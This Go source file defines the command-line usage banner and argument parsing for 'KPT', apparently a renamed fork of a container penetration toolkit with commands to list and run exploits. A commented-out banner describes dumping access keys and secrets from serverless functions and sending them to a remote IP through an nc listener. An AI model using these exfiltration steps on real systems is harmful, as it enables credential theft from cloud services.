package cli

import (
	"fmt"
	"log"
	"os"

	"github.com/docopt/docopt-go"
)

var Args docopt.Opts

var GitCommit string

var BannerVersion = fmt.Sprintf("%s %s", "KPT Version(GitCommit):", GitCommit)

// var BannerHeader = fmt.Sprintf(`Container DucK
// %s
// Zero-dependency k8s/docker/serverless penetration toolkit by cdxy & neargle
// Find tutorial, configuration and use-case in https://github.com/cdk-team/CDK/wiki
// `, BannerVersion)

var BannerContainer = `
Usage:
  kpt evaluate [--full]
	kpt eva [--full]
  kpt run (--list | <exploit> [<args>...])
  kpt <tool> [<args>...]

Evaluate:
  kpt evaluate                              Gather information to find weakness inside container.
  kpt eva                                  Alias of "cdk evaluate".

Exploit:
  kpt run --list                            List all available exploits.
  kpt run <exploit> [<args>...]             Run single exploit.


Options:
  -h --help     Show this help msg.
  -v --version  Show version.
`

// var BannerServerless = BannerHeader + `
// THIS IS THE SLIM VERSION FOR DUMPING SECRET/AK IN SERVERLESS FUNCTIONS.

// sessions in serverless functions will be killed in seconds, use this tool to dump AK/secrets in the fast way.

// Usage:
// cdk-serverless <scan-dir> <remote-ip> <port>

// Args:
// scan-dir                 Read all files under target dir and dump AK token.
// remote-ip,port           Send results to target IP:PORT via TCP tunnel.

// Example:
// 1. public server(e.g. 1.2.3.4) start listen tcp port 999 using "nc -lvp 999"
// 2. inside serverless function service execute "./cdk-serverless /code 1.2.3.4 999"
// `

func parseDocopt() {
	args, err := docopt.ParseArgs(BannerContainer, os.Args[1:], "0.1")
	if err != nil {
		log.Fatalln("docopt err: ", err)
	}
	Args = args
}
